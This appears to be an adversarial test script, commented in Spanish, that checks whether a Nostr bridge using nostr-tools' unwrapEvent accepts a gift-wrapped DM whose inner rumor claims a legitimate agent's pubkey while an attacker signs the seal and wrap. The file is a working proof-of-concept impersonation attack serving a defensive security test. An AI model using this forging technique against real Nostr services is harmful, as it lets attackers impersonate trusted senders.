// Test adversarial M-NEW: gift-wrap con rumor.pubkey != seal.pubkey
// nostr-tools 2.24.1: unwrapEvent descifra el seal con la clave de conversacion
// derivada de seal.pubkey y devuelve el rumor con su pubkey interno SIN compararlo
// con quien firmo el seal. Verificamos si el bridge aceptaria un DM suplantado.
const {generateSecretKey, getPublicKey, finalizeEvent} = require('nostr-tools');
const nip44 = require('nostr-tools/nip44');
const {unwrapEvent} = require('nostr-tools/nip17');

console.log('nostr-tools 2.24.1 — test adversarial rumor.pubkey != seal.pubkey\n');

// Claves
const bridgePriv = generateSecretKey();
const bridgePub = getPublicKey(bridgePriv);
const legitAgentPriv = generateSecretKey();
const legitAgentPub = getPublicKey(legitAgentPriv);
const attackerPriv = generateSecretKey();
const attackerPub = getPublicKey(attackerPriv);

console.log('bridgePub      :', bridgePub.slice(0, 12) + '...');
console.log('agente legitimo:', legitAgentPub.slice(0, 12) + '... (rumor declarará este)');
console.log('atacante       :', attackerPub.slice(0, 12) + '... (firma el seal/wrap)\n');

// 1) Rumor: kind 14, pubkey DECLARA ser el agente legitimo
const rumor = {
  kind: 14,
  created_at: Math.floor(Date.now() / 1000),
  content: 'status',
  tags: [['p', bridgePub]],
  pubkey: legitAgentPub,
};
rumor.id = require('nostr-tools').getEventHash(rumor);

// 2) Seal: lo firma el ATACANTE (NO el dueño del rumor.pubkey). Cifrado para el bridge
const attackerConvKey = nip44.getConversationKey(attackerPriv, bridgePub);
const seal = finalizeEvent({
  kind: 13,
  content: nip44.encrypt(JSON.stringify(rumor), attackerConvKey),
  created_at: Math.floor(Date.now() / 1000),
  tags: [],
}, attackerPriv);

// 3) Wrap: lo firma el ATACANTE, cifrado para el bridge
const wrap = finalizeEvent({
  kind: 1059,
  content: nip44.encrypt(JSON.stringify(seal), attackerConvKey),
  created_at: Math.floor(Date.now() / 1000),
  tags: [['p', bridgePub]],
}, attackerPriv);

console.log('seal.pubkey (firmante real del seal):', seal.pubkey.slice(0, 12) + '...');
console.log('wrap.pubkey (firmante del wrap)     :', wrap.pubkey.slice(0, 12) + '...');

// 4) El bridge descifra con bridgePriv (lo que hace handleIncomingGiftWrap)
let unwrapped;
try {
  unwrapped = unwrapEvent(wrap, bridgePriv);
  console.log('\n[unwrapEvent] descifró el wrap malicioso (no lanzó error)');
  console.log('  rumor.pubkey :', unwrapped.pubkey.slice(0, 12) + '...');
  console.log('  content      :', JSON.stringify(unwrapped.content));
  const mismatch = unwrapped.pubkey !== seal.pubkey;
  console.log('\n  rumor.pubkey == seal.pubkey ?', mismatch ? 'NO (MISMATCH)' : 'SI');
  if (mismatch && unwrapped.pubkey === legitAgentPub) {
    console.log('  >>> IMPOSTURA DEMOSTRADA: el rumor declara el agente legítimo,');
    console.log('      el seal lo firmó el atacante, y unwrapEvent lo acepta.');
    console.log('      El bridge haría agentByPubkey(rumor.pubkey) -> lo aceptaría');
    console.log('      como DM del agente legítimo aunque lo envió el atacante.');
  } else if (mismatch) {
    console.log('  >>> Hay mismatch pero NO suplanta un agente conocido.');
  } else {
    console.log('  >>> No hay mismatch. (?)');
  }
} catch (e) {
  console.log('\n[unwrapEvent] FALLÓ:', e.message);
  console.log('>>> El ataque NO trivial: unwrapEvent/verify rechazó el wrap malicioso.');
}
